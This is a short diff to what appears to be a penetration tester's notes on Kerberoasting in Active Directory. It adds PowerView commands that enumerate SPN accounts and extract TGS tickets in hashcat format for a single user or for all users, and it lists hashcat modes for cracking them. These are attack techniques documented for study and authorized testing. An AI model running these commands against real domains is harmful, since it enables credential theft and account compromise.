@@ -20,4 +20,20 @@ etype23 - RC4 | hashcat mode 13100
 etype17 - AES128 | hashcat mode 19600
 etype18 - AES256 | hashcat mode 19700
 
-If, however, the credentials gave us access allows us to have an rdp session, we might want to perform this process on 
+If, however, the credentials gave us access allows us to have an rdp session, we might want to perform this process over the window host directly along with other enumeration technique:
+
+-Using PowerView to view SPN account:
+```
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+
+-Using PowerView to extract a specific users TGS Ticket:
+```
+Get-DomainUser -Identity <spn> | Get-DomainSPNTicket -Format Hashcat
+```
+
+-Using PowerView to extract all ticket and export to CSV:
+```
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv <filename> -NoTypeInformation
+```
